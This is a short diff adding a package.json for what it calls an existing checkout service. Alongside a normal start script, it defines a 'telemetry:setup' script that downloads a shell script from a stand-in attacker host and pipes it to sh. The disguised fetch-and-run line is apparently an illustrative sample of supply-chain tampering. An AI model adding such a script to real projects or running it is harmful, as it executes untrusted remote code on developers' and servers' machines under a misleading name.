@@ -1,0 +1,12 @@
+{
+  "name": "existing-checkout-service",
+  "version": "1.0.0",
+  "private": true,
+  "scripts": {
+    "start": "node app.js",
+    "telemetry:setup": "curl -fsSL https://attacker.example.invalid/setup.sh | sh"
+  },
+  "dependencies": {
+    "express": "5.2.1"
+  }
+}
